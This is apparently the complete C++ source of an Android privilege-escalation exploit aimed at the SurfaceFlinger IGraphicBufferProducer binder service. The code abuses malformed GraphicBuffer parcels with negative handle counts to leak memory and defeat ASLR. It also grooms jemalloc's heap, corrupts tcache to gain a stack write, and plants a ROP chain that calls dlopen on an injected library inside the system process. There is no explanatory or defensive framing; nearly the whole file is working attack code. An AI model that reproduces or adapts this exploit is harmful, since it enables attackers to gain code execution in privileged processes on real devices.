#define private public
#define protected public
#include <binder/Binder.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <binder/ProcessState.h>
#include <binder/TextOutput.h>
#include <binder/IPCThreadState.h>
#include <cutils/ashmem.h>
#include <fcntl.h>
#include <getopt.h>
#include <gui/SurfaceComposerClient.h>
#include <gui/Surface.h>
#include <ui/Fence.h>
#include <ui/GraphicBuffer.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <gui/BufferQueueProducer.h>
#include <signal.h>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#define JEMALLOC_H_TYPES
#include "jemalloc/internal/qr.h"
#include "jemalloc/internal/ql.h"
#include "jemalloc/internal/arena.h"
#define JEMALLOC_H_STRUCTS
#include "jemalloc/internal/stats.h"
#include "jemalloc/internal/tcache.h"
#undef JEMALLOC_H_STRUCTS
#undef JEMALLOC_H_TYPES

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "exploit", __VA_ARGS__)
using namespace android;

extern int getGOTOffset(const char * module_name,const char * symbol_name,int *memcpyOffset);
extern unsigned int getOffset(const char *moduleName,const char *funcName);

namespace threadsignal{
    void thread_exit_handler(int /*sig*/)
    { 
        pthread_exit((void*)-2);
    }
    void setHandler(){
        struct sigaction actions;
        memset(&actions, 0, sizeof(actions)); 
        sigemptyset(&actions.sa_mask);
        actions.sa_flags = 0; 
        actions.sa_handler = thread_exit_handler;
        sigaction(SIGUSR1,&actions,NULL);
    }
}
namespace pingserver{
    struct args_t{
        sp<IBinder> *binder;
        bool isSetHandler;
    };
    void *ping(void *args){
        struct args_t *theArgs = (struct args_t *)args;
        threadsignal::setHandler();
        sp<IBinder> *binder = theArgs->binder;
        theArgs->isSetHandler=true;
        (*binder)->pingBinder();
        return NULL;
    }
    bool isAllBinderThreadHang(sp<IBinder> binder){
        pthread_t t;
        struct args_t args; 
        args.binder=&binder;
        args.isSetHandler=false;
        pthread_create(&t, NULL, ping, (void *)&args );
        while(!args.isSetHandler){
            sleep(0.2);
        }
        sleep(1);
        pthread_kill(t,SIGUSR1);
        void *ret;
        pthread_join(t,&ret);
        return ret==(void*)-2?true:false;
    }
}

namespace threadcontrol{

    sp<IGraphicBufferProducer> producer;
    sp<SurfaceComposerClient> client;
    sp<SurfaceControl> surfaceControl;
    sp<Surface> surface;
    pthread_t t[20];
    void initGloble(){
            client = new SurfaceComposerClient();
            surfaceControl = client->createSurface(String8("forhang"),
                    600, 800, PIXEL_FORMAT_RGB_565, 0);
            surface = surfaceControl->getSurface();
            producer = surface->getIGraphicBufferProducer();
            producer->setBufferCount(2);
    }
    void init(){
        initGloble();
    }
    void uninitGloble(){
            client = NULL; 
            surfaceControl = NULL;
            surface = NULL; 
            producer = NULL;
    }
    void *attach(void * /*args*/){
        int newSlot = -1;
        sp<GraphicBuffer> bf = new GraphicBuffer(3,3,1,3);
        for(int i=0;i<3;i++){
                status_t status = producer->attachBuffer(&newSlot,bf); 
                if(status!=0){
                    aout<<"attach Buffer "<<newSlot<<" failed with "<<status<<endl;
                }/*else
                    aout<<"attach buffer "<<newSlot<<" successfully"<<endl;*/
            }


        return NULL;

    }
    int resumeBinderThreads(){

        aout<<"called resumeBinderThreads"<<endl;
        //uninitGloble();
        for(int i=0;i<40;i++){

            sp<Fence> fence = new Fence();
            producer->cancelBuffer(0,fence);
            producer->cancelBuffer(1,fence);

        }
        sleep(1);
        return 0;
    }

    int suspendBinderThreads(){

        //initGloble();
        aout<<"called suspendBinderThreads"<<endl;
        for(int i=0;i<4;i++)
            pthread_create(&t[i], NULL, attach, NULL );
        sleep(1.5);
        /*if(pingserver::isAllBinderThreadHang(producer->asBinder())){
            aout<<"++++++++++++dead lock+++++++++++"<<endl;
            resumeBinderThreads();
            sleep(2);
            suspendBinderThreads();
        }else
            aout<<"ping ok"<<endl;*/
        return 0;
    }
} 
namespace threadcontrol2{ 
    sp<ISurfaceComposer> composer;
    sp<IGraphicBufferProducer> producer;
    sp<IBinder> display;
    typedef status_t (*ONTRANSACT)(BnGraphicBufferProducer *pthis,uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags);
    ONTRANSACT originalOnTransact = NULL; 
    volatile bool endLoop = true;

    status_t onTransact(BnGraphicBufferProducer *pthis,uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags){

        status_t ret = originalOnTransact(pthis,code,data,reply,flags);
        while(!endLoop){
            sleep(0.5);
        }
        return ret;
    }

    void *capscreen(void *)
    {
        printf("thread started\n");
        sleep(1);
        status_t err = composer->captureScreen(display, producer,Rect(600,800), 0,0,0,-1UL,false,ISurfaceComposer::eRotateNone );
        if (err != NO_ERROR) {
            fprintf(stderr, "screen capture failed: %s\n", strerror(-err));
        }

        printf("screen capture success\n");
        return NULL;
    }
    int resumeBinderThreads()
    {
        aout<<"called resumeBinderThreads"<<endl;
        endLoop = true;
        sleep(2);
        return 0;
    }

    void init()
    {

        const String16 name("SurfaceFlinger");
        getService(name, &composer);

        uint32_t w, h;
        PixelFormat f;
        display=(composer->getBuiltInDisplay(ISurfaceComposer::eDisplayIdMain));
        sp<IGraphicBufferConsumer> consumer;
        BufferQueue::createBufferQueue(&producer, &consumer);
        BnGraphicBufferProducer *p =   static_cast<BnGraphicBufferProducer*>(producer->asBinder()->localBinder());
        int onTranAddress = *((int*)p+1)+16*4;
        mprotect((void*)(onTranAddress&0xfffff000),4096,PROT_READ|PROT_WRITE);
        originalOnTransact = (ONTRANSACT)*(int*)onTranAddress;
        *(int*)onTranAddress = (int)&onTransact;
        sp<CpuConsumer> cpuConsumer = new CpuConsumer(consumer, 1);


    }
    int suspendBinderThreads()
    {

        endLoop = false;

#define threadCount 4
        pthread_t t[threadCount];
        for(uint32_t i = 0; i < threadCount; i++){
            pthread_create( &t[i], NULL, capscreen, (void *)NULL );
        }
        sleep(1.5);
        if(pingserver::isAllBinderThreadHang(producer->asBinder())){
            aout<<"++++++++++++dead lock+++++++++++"<<endl;
            resumeBinderThreads();
            sleep(2);
            suspendBinderThreads();
        }else
            aout<<"ping ok"<<endl;
        return 0;
    }
}

sp<IGraphicBufferProducer> producer;
Parcel *requestBuffer(int bufferIdx,sp<IGraphicBufferProducer> producer)
{
    sp<IBinder> binder= producer->asBinder();
    Parcel data;
    Parcel *reply = new Parcel();
    data.writeInterfaceToken(String16("android.gui.IGraphicBufferProducer"));
    data.writeInt32(bufferIdx);

    status_t status =binder->transact(1, data, reply,0);
    for(int i=0;i<10;i++)
        if(status!=0){
            delete reply;
            reply = new Parcel();
            aout<<"transact failed with "<<status<<" retry transact"<<endl;
            status = binder->transact(1, data, reply,0);
        }
    return reply;
}

void prepareData(Parcel &data,int numFds,int numInts)
{

    //aout<<"---------------"<<numFds<<":"<<numInts<<"========"<<endl;
    String16 ifName = IGraphicBufferProducer::descriptor;
    data.writeInterfaceToken(ifName);
    data.writeInt32(1);//status flags
    data.writeInt32(numFds);//-23
    data.writeInt32(numInts);//37

}

Parcel *getRemoteMemory(int newSlot,int numFds,int numInts, GraphicBuffer *findedBuffer,buffer_handle_t handle)
{

    sp<IBinder> binder= producer->asBinder();
    Parcel data,unusedReply;
    prepareData(data,numFds,numInts);
    GraphicBuffer *exploitBuffer = (GraphicBuffer*)malloc(sizeof(GraphicBuffer));
    memcpy(exploitBuffer,findedBuffer,sizeof(GraphicBuffer));
    exploitBuffer->handle = handle;
    for(int i=0;i<numInts/32+1;i++)
        data.write(exploitBuffer,sizeof(GraphicBuffer));

    //0x48 reserved_proc
    status_t status = binder->transact(12, data, &unusedReply,0);
    for(int i=0;i<10;i++)
        if(status!=0){
            aout<<"transact failed with "<<status<<" retry transact"<<endl;
            status = binder->transact(12, data, &unusedReply,0);
        }
    Parcel *reply = requestBuffer(newSlot,producer);
    free(exploitBuffer);
    return reply;
}
int getSystemFuncAddress(const Parcel *libui)
{

    unsigned char *p = (unsigned char*)libui->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libui base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libui->dataSize();
    int memcpyOffset = -1; 
    getGOTOffset("/system/lib/libui.so","memcpy",&memcpyOffset);
    int memcpyAddress = *(int *)(p+memcpyOffset-(0x18+12+0x34*4));
    //raise(SIGINT);
    aout<<"memcpy in surfaceflinger is "<<(void*)memcpyAddress<<endl;
    int memcpyOffsetFromBase = getOffset("libc.so","memcpy");
    int systemOffsetFromBase = getOffset("libc.so","system");

    aout<<memcpyOffsetFromBase<<" "<<systemOffsetFromBase<<endl;
    int systemAddressInSurfaceflinger = memcpyAddress-memcpyOffsetFromBase+systemOffsetFromBase;

    aout<<"system in surfaceflinger is "<<(void*)systemAddressInSurfaceflinger<<endl;
    return systemAddressInSurfaceflinger;
}

int getDlopenFuncAddress(const Parcel *libc)
{

    unsigned char *p = (unsigned char*)libc->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libc base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libc->dataSize();
    int dlopenOffset = -1; 
    getGOTOffset("/system/lib/libc.so","dlopen",&dlopenOffset);
    //0xb6f643e4 <_DYNAMIC+4>:    0x00068650  0x00000002  0x00001348  0x00000017
    int dlopenAddress = *(int *)(p+dlopenOffset-(0x683e4+12+0x2*4));
    //raise(SIGINT);
    aout<<"dlopen in surfaceflinger is "<<(void*)dlopenAddress<<endl;
    return dlopenAddress;
}

void *getStackBase(const Parcel *searchedParcel){
    uint32_t size = searchedParcel->dataSize();
    aout<<"search stack "<<(void*)size<<endl;
    for(uint32_t j=12;j<size-4;j++){

        uint32_t *p = (uint32_t*)((uint32_t)searchedParcel->data()+j);

        if(p[0]==600&&p[1]==800)
        {
            if( ((p[-1]+0x1000)&0xfffff000) == ((p[-3]+0x1000)&0xfffff000) )
            {
                void *pStackBase = (void*)((p[-1]+0x1000)&0xfffff000);
                aout<<"-----------find stack address at "<<pStackBase<<"-----------"<<endl;
            }
        }

    }
    return NULL;
}
int main(__attribute__((unused)) int argc, __attribute__((unused)) char **  argv)
{
    const uint32_t offsetFromIncRefToLibuibase = 0x6449;
    uint32_t pChunk = 0;
    uint32_t pTcache = 0;
    uint32_t gap = 0;
    aout<<"i'm started"<<endl;
    aout<<"sizeof(GraphicBuffer) is "<<sizeof(GraphicBuffer)<<endl;//128
    aout<<"sizeof(BufferQueueProducer) is "<<sizeof(BufferQueueProducer)<<endl;//44

    sp<ProcessState> proc(ProcessState::self());
    proc->startThreadPool();

    threadcontrol::init();

    //prepare exploit data
    Parcel data,data1,reply;
    String16 ifName = IGraphicBufferProducer::descriptor;
    data.writeInterfaceToken(ifName);
    data.writeInt32(1);//status flags
    //控制覆盖的位置
    data.writeInt32(-23);//-23
    data.writeInt32(37);//37

#define BUFFERLEN 0xfaffc
    int buffer[BUFFERLEN/4];
    for(size_t i=0;i<BUFFERLEN;i+=4)
        buffer[i/4]=0xcccccccc;
    //控制返回内容多少
    buffer[1]=0;   //numFds
    buffer[2]=0x10000;//0x1ffff;   //numInts
    data.write(buffer,BUFFERLEN);

    //heap fengshui
    status_t status = 0;
    sp<SurfaceComposerClient> client = new SurfaceComposerClient();
    for(int f=0;f<400;f++){
        sp<SurfaceControl> surfaceControl = client->createSurface(String8("resize"),
                600, 800, PIXEL_FORMAT_RGB_565, 0);
        surfaceControl = NULL;
    }
    sp<SurfaceControl> surfaceControl = client->createSurface(String8("resize"),
            600, 800, PIXEL_FORMAT_RGB_565, 0);
    sp<Surface> surface = surfaceControl->getSurface();
    producer = surface->getIGraphicBufferProducer();
    producer->setBufferCount(64);

    bool bIsHeapStable = false;
    GraphicBuffer *findedBuffer = NULL;
    void * findedNativeHandle = NULL;
    void * incRef = NULL;
    void * stackBase = NULL;
    int offset = 0;
    int modifyedGraphicBuffer = 0;
    sp<IBinder> binder = producer->asBinder();
    srand(time(NULL));
    for(int k=1;k<50&&bIsHeapStable==false;k++)//loop to select a statable heap status 
    {

        int newSlot=-1;
        const unsigned int buffercount = rand()%5+1; 
        int randomWidth=rand()%1000;
        int randomHeight=rand()%1000;
        threadcontrol::suspendBinderThreads();

        //hope to fill holes 
        sp<GraphicBuffer> pbuffer = new GraphicBuffer(3,3,1,3);
        int slot = 0;
        const int preFilledBuffers = rand()%50;
        for(int i=0;i<preFilledBuffers;i++){
            status = producer->attachBuffer(&slot,pbuffer); 
            if(status!=0){
                aout<<"attach Buffer "<<slot<<" failed"<<endl;
                exit(-1);
            }
        }


        sp<GraphicBuffer> bf = new GraphicBuffer(randomWidth,randomHeight,1,3);
        for(unsigned int i=0;i<buffercount;i++){
            status = producer->attachBuffer(&newSlot,bf); 
            if(status!=0)
                aout<<"attach Buffer "<<newSlot<<" failed"<<endl;

        }
        //aout<<"start boom"<<endl;
        binder->transact(12, data, &reply,0);

        Parcel *replyBuffer = requestBuffer(newSlot,producer);
        aout<<"slot "<<newSlot<<" return size is "<<replyBuffer->dataSize()<<endl;
        if(replyBuffer->dataSize()!=136)
        {
            unsigned int *p = (unsigned int*)replyBuffer->data();
            uint32_t findedBufferCount=0;
            bool isFirstcc = true;
            for(size_t j=4;j<replyBuffer->dataSize()/4;j++)
            {
                if(p[j]==600&&p[j+1]==800)
                {
                    if(p[j-1]!=0&&((p[j-1]+0x1000)&0xfffff000) == ((p[j-3]+0x1000)&0xfffff000) )
                    {
                        stackBase = (void*)((p[j-1]+0x1000)&0xfffff000);
                        //aout<<"-----------find stack address at "<<stackBase<<"-----------"<<endl;
                    }
                }
            }
            //we must first find stack address
            if(stackBase==NULL)
            {
                aout<<"haven't found stack base"<<endl;
                threadcontrol::resumeBinderThreads();
                delete replyBuffer;
                for(int i=0;i<=newSlot;i++){
                    status = producer->detachBuffer(i);
                    if (status!=0)
                        aout<<"detach buffer "<<i<<"failed"<<endl;

                }
                continue;
            }
            for(size_t j=4;j<replyBuffer->dataSize()/4;j++)
            {
                //find the address of libui.so 
                if(p[j]==0x5f626672)//'_','b','f','r'
                {
                    findedBuffer = (GraphicBuffer*)(&p[j]-2);
                    //aout<<"find GraphicBuffer at "<<j<<endl;
                    //aout<<"version is:"<<findedBuffer->common.version<<" incRef is:"<<(void *)findedBuffer->common.incRef<<"heap address is:"<<findedBuffer->handle<<endl;
                    //aout<<"width is:"<<findedBuffer->width<<"height is:"<<findedBuffer->height<<endl;
                    if(findedBuffer->width==randomWidth&&findedBuffer->height==randomHeight)
                        findedBufferCount++;
                    else if(findedBufferCount>0)//需要连续内存
                    {
                        aout<<"not contigous memeory"<<endl;
                        break;
                    }
                    if(findedBufferCount==buffercount){
                        incRef = (void*)(findedBuffer->common.incRef);
                        pChunk = (uint32_t)findedBuffer->handle&0xfff00000;
                        gap = (uint32_t)findedBuffer->handle&0xfffff;
                        pTcache = pChunk+0x1000;
                        aout<<"thunk at "<<(void*)pChunk<<",tcache at "<<(void*)pTcache<<",gap is "<<(void*)gap<<endl;
                        break;
                    }
                } 
                if(p[j]==0xcccccccc&&isFirstcc){
                    findedNativeHandle = (void*)(&p[j]-3);
                    offset = j-3;
                    isFirstcc = false;
                }
            }

            if(findedBufferCount == buffercount){
                aout<<"get the stable heap status"<<endl;
                bIsHeapStable = true;
            }else
                aout<<findedBufferCount<<" heap is not in stable status, retry"<<endl; 
            //aout<<*replyBuffer<<endl;
        }

        if(bIsHeapStable==false)
            for(int i=0;i<=newSlot;i++){
                status = producer->detachBuffer(i);
                if (status!=0)
                    aout<<"detach buffer "<<i<<"failed"<<endl;

            }

        if(bIsHeapStable){
            //print some infomation
            aout<<(void*)findedBuffer<<":"<<(void*)findedNativeHandle<<":"<<(void*)(findedBuffer->handle)<<endl;
            printf("native handle memory\n");
            for(int *p=(int*)findedNativeHandle;p<(int*)findedNativeHandle+4;p++)
                printf("0x%.8x ",(unsigned int)*p);
            printf("\nfinded Buffer Memmory");
            for(int *p=(int*)findedBuffer;p<(int*)findedBuffer+4;p++)
                printf("0x%.8x ",(unsigned int)*p);
            printf("\n");
            modifyedGraphicBuffer = ((int)findedBuffer-(int)findedNativeHandle)+(int)(findedBuffer->handle);
            aout<<"native handle at "<<findedBuffer->handle<<" relative offset is "<<offset<<endl;
            aout<<"find modifyedGraphicBuffer at "<<(void*)modifyedGraphicBuffer<<endl;
            //leak memcpy address from the GOT of libui
            GraphicBuffer *exploitBuffer = (GraphicBuffer*)malloc(sizeof(GraphicBuffer));
            unsigned int libuiBase = (unsigned int)(incRef)-0x6449;
            unsigned int fakedhandle = libuiBase+0x18;
            aout<<"libuiBase "<<(void*)libuiBase<<" fakehandle "<<(void*)fakedhandle<<endl;
            Parcel *libuiContent = getRemoteMemory(newSlot,-35,64,findedBuffer,(buffer_handle_t)fakedhandle);
            aout<<libuiContent->dataSize()<<endl;
            int systemAddress = getSystemFuncAddress(libuiContent);
            delete libuiContent;

            //get dlopen addres from got of libc
            unsigned int libcbase = (unsigned int)systemAddress-getOffset("libc.so","system")-1;
            aout<<"libc base is "<<(void*)libcbase<<endl;
            Parcel *libcContent = getRemoteMemory(newSlot,-67,96,findedBuffer,(buffer_handle_t)(libcbase+0x683e4));
            aout<<"leaked libc size "<<libcContent->dataSize()<<endl;
            int dlopenAddress = getDlopenFuncAddress(libcContent);
            delete libcContent;


            {
                aout<<"chunk is at "<<(void*)pChunk<<endl;
                Parcel *pReply = getRemoteMemory(newSlot,-99,128,findedBuffer,(buffer_handle_t)(pChunk+7));
                uint32_t *p = (uint32_t*)pReply->data();
                uint32_t nFds = p[11];
                uint32_t nInts =p[12];
                aout<<"return data len "<<pReply->dataSize()<<endl;
                aout<<"nFds is "<<p[11]<<" nInts is "<<p[12]<<endl;
                uint32_t *pnumInts = (uint32_t*)&p[13];
                native_handle_t *pSearchHandle = NULL;
                native_handle_t *pMaxHandle = NULL;
                //search in the first 1KB to find a native handle
                for(size_t i=0;i<nInts-sizeof(native_handle_t)&&i<0x1000-7-12-4*nFds;i++){
                    pSearchHandle = (native_handle_t *)((int)pnumInts+i);
                    if(pSearchHandle->numFds>=0&&pSearchHandle->numFds<=0x800&&pSearchHandle->numInts>0xa000&&pSearchHandle->numInts<0x18fff)
                    {
                        //ensure the first leaked address smaller than chunk+1k
                        if(7+12+4*pSearchHandle->numFds>=0x1000)
                        {
                            aout<<"can't leak tcache from beginnin, retry"<<endl;
                            continue;
                        }

                        if(pMaxHandle==NULL||pMaxHandle->numInts<pSearchHandle->numInts)
                            pMaxHandle = pSearchHandle;
                    }
                }
                if(pMaxHandle==NULL)
                {
                    aout<<"search handle failed\n";
                    goto _fail;

                }
                uint32_t offsetFromPreviousHandle = (uint32_t)pMaxHandle-(uint32_t)pnumInts;
                native_handle_t * remoteHandle = (native_handle_t *)(pChunk+7+4*nFds+12+offsetFromPreviousHandle);
                if((uint32_t)remoteHandle>(uint32_t)pChunk+0x1000)//exceed tcache
                {
                    aout<<"exceed tcache"<<endl;
                    goto _fail;

                }
                aout<<"selected index of numInts is "<<(void*)(offsetFromPreviousHandle)<<endl;
                aout<<"remote handle address is "<<(void*)remoteHandle<<endl;
                aout<<"numFds is"<<(void*)pMaxHandle->numFds<<" numInts is "<<(void*)(pMaxHandle->numInts)<<endl;
                free(pReply);

                //leak large size of heap include tcache
                Parcel *pHeap = getRemoteMemory(newSlot,-131,160,findedBuffer,(buffer_handle_t)remoteHandle);
                aout<<"return heap size is "<<(void*)pHeap->dataSize()<<endl;
                uint32_t startOfLeakedHeap = (uint32_t)pHeap->data()+13*4;
                uint32_t leftBytes = (uint32_t)pChunk+0x1000-(uint32_t)remoteHandle-12-(uint32_t)pMaxHandle->numFds;
                if(leftBytes>0x1000)
                {   
                    aout<<"logical error"<<endl;
                    exit(-1);
                }
                tcache_t * pTcache = (tcache_t*)(startOfLeakedHeap+leftBytes);
                tcache_bin_t binForSize128 = pTcache->tbins[11];
                aout<<"avail is "<<(void*)binForSize128.avail<<" ncached is "<<binForSize128.ncached<<endl;
                if(binForSize128.ncached<2){
                    aout<<"no cached pointer"<<endl;
                    goto _fail;
                }
                uint32_t offsetToNextAllocPoint = (uint32_t)(binForSize128.avail)+(binForSize128.ncached-1)*4-pChunk-0x1000;
                uint32_t overwritedHeapSize = ((modifyedGraphicBuffer&0x000fffff)-0x1000)+5*128+3*4;
                char * modifiedHeap = (char*)malloc(overwritedHeapSize);
                memcpy(modifiedHeap,(void*)pTcache,overwritedHeapSize);
                //memset(modifiedHeap,0xcc,overwritedHeapSize);
                uint32_t localPositionOfNextAllocPoint = (uint32_t)modifiedHeap+offsetToNextAllocPoint;
                aout<<"overwrite heap size is "<<(void*)overwritedHeapSize<<endl;
                aout<<"next alloc point for 128 size is "<<(void*)*(uint32_t*)localPositionOfNextAllocPoint<<endl;
                //sleep(900);
                //stack top to write place is 0xfcb88 in aosp
                //stack top to write place is 0xfcb88-0xc=0xfcb7c in loliipop factory image
                uint32_t ropPosition = (uint32_t)stackBase-0xfd000+0xfcb88;//-20+8+4;
                aout<<"rop position is "<<(void*)ropPosition<<endl;
                *(uint32_t*)localPositionOfNextAllocPoint= ropPosition;


                Parcel dataOverWriteHeap,writeHeapReply;
                prepareData(dataOverWriteHeap,-(overwritedHeapSize/4),29+overwritedHeapSize/4);
                dataOverWriteHeap.write((void*)modifiedHeap,overwritedHeapSize-3*4);
                int pad[60];
                dataOverWriteHeap.write((void*)pad,60*4);
                status_t status = binder->transact(12, dataOverWriteHeap, &writeHeapReply,0);
                if(status!=0)
                    aout<<"transact failed with "<<status<<endl;
                aout<<"control heap successfully"<<endl;

                //write stack 
                Parcel dataROP;
                prepareData(dataROP,0,29);
                //--------------aosp------------------------------------
                //(gdb) x/2hx 0xb6f6f000+0x4ffd0
                //0xb6fbefd0 <__stpcpy_chk(char*, char const*, size_t)+40>: 0xbd7f  0xbf00
                //(gdb) x/i  0xb6f6f000+0x4ffd0
                //0xb6fbefd0 <__stpcpy_chk(char*, char const*, size_t)+40>:  pop {r0, r1, r2, r3, r4, r5, r6, pc}
                //--------------loliipop factory image------------------
                //offset is 0x4ffd8

                const uint32_t offsetToRopgadget = 0x4ffd0;
                uint32_t ropData[29]={libcbase+offsetToRopgadget+1,ropPosition+3*4+9*4,0,2,3,4,5,6,(uint32_t)dlopenAddress};
                const char * soPath ="/data/system/tmp/libinject.so";//"/data/data/com.apps.forso/files/libinject.so";
                memcpy(ropData+9, soPath, strlen(soPath)+1);
                dataROP.write(ropData,29*4);
                status = binder->transact(12, dataROP, &writeHeapReply,0);
                if(status!=0)
                    aout<<"transact failed(write rop) with "<<status<<endl;
                aout<<"write rop successfully, waiting for trigger.."<<endl;
                //Parcel *pWriteStack = getRemoteMemory(newSlot,0,29,findedBuffer,(buffer_handle_t)remoteHandle);
                //raise(SIGINT);
                free(modifiedHeap);
                free(pHeap);
                aout<<"good"<<endl;
            }

            goto _success;
_fail:
            bIsHeapStable = false;
_success:
            free(exploitBuffer);

            for(int i=0;i<=newSlot;i++){
                status = producer->detachBuffer(i);
                if (status!=0)
                    aout<<"detach buffer "<<i<<"failed"<<endl;

            }
        }else{
            aout<<"get stable heap failed, retry"<<endl;
        }
        threadcontrol::resumeBinderThreads();
        delete replyBuffer;
    }
    aout<<"done"<<endl;
    return 0;
}
extern "C" void so_main(int fd0, int fd1){
    LOGE("fd0 is %d, fd1 is %d\n",fd0,fd1);
    write(fd1,"success",8);
    while ((dup2(fd1, STDOUT_FILENO) == -1) && (errno == EINTR)) {}
    printf("test printf redirect\n");
    main(0,NULL);
}
